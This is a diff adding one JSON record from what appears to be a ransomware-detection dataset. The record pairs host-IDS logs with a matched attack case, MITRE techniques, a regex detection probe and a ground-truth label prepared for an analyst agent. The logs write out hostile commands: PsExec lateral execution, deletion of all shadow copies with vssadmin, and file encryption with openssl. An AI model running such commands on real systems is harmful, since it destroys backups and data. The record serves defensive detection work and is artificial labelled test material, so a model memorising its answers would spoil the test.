@@ -1,0 +1,121 @@
+{
+ "unit": 1097,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "PsExec 远程会话投放并运行加密器清空共享目录",
+ "sources": [
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-08 23:05:17",
+   "source": "hids",
+   "log_id": "HID0497045",
+   "content": "psexec \\\\10.20.6.77 -s -d cmd.exe /c copy \\\\10.20.3.9\\pub\\openssl.exe C:\\openssl.exe <== cmd.exe /c psexec <==",
+   "event_id": "1097-HID0497045"
+  },
+  {
+   "timestamp": "2026-07-08 23:08:27",
+   "source": "hids",
+   "log_id": "HID0497061",
+   "content": "psexec \\\\10.20.6.77 -s cmd.exe /c \"vssadmin delete shadows /all /quiet & openssl enc -aes-256-cbc -pass file:C",
+   "event_id": "1097-HID0497061"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-005",
+   "name": "勒索式数据破坏：删卷影 + 批量加密",
+   "summary": "上传接口落地 WebShell → 主机侧用 cipher 批量加密共享目录 → 删除全部卷影副本破坏恢复能力（先加密后破坏，与样本时间序一致）。",
+   "matched_steps": 1,
+   "total_steps": 3,
+   "shape": "middle",
+   "longest_run": 1,
+   "tier": "weak",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S3",
+     "action_id": "vssadmin_delete_shadows_all",
+     "label": "删除全部卷影副本",
+     "event_ids": [
+      "1097-HID0497061"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": false
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 7,
+   "keyword_details": [
+    "keyword +3: vssadmin delete shadows",
+    "probe +4: vssadmin(?:\\.exe)?\\s+delete\\s+shadows\\s+/all"
+   ],
+   "mitre": [
+    "T1486",
+    "T1490",
+    "T1505.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2"
+   ],
+   "before_steps": [
+    "S1",
+    "S2"
+   ],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 1
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "weak",
+  "shape": "middle",
+  "matched_steps": 1,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S3",
+    "label": "删除全部卷影副本",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1097-HID0497061"
+    ]
+   }
+  ],
+  "unobserved_steps": [
+   "S1",
+   "S2"
+  ],
+  "gap_steps": [],
+  "before_steps": [
+   "S1",
+   "S2"
+  ],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 7,
+  "mitre": [
+   "T1486",
+   "T1490",
+   "T1505.003"
+  ]
+ }
+}
